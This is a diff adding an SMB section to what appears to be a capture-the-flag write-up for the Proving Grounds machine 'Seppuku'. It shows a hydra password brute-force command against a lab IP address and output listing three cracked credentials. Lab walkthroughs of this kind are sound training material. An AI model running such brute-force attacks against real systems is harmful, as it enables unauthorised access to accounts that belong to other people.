@@ -21,6 +21,25 @@ Get the credential _seppuku:eeyoree_
 
 ![hydra](../../../../assets/images/ctfs/proving_grounds/seppuku/hydra.png)
 
+## SMB
+
+```bash
+┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
+└─$ hydra -L users -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://192.168.166.90
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-30 08:46:53
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 3027 login tries (l:3/p:1009), ~3027 tries per task
+[DATA] attacking smb://192.168.166.90:445/
+[445][smb] host: 192.168.166.90   login: admin   password: tinkerbell
+[445][smb] host: 192.168.166.90   login: administrator   password: password1
+[445][smb] host: 192.168.166.90   login: root   password: elizabeth
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-30 08:46:58
+
+
+```
+
 ## MySQL
 
 Run Hydra against the mysql service with the _root_ username.
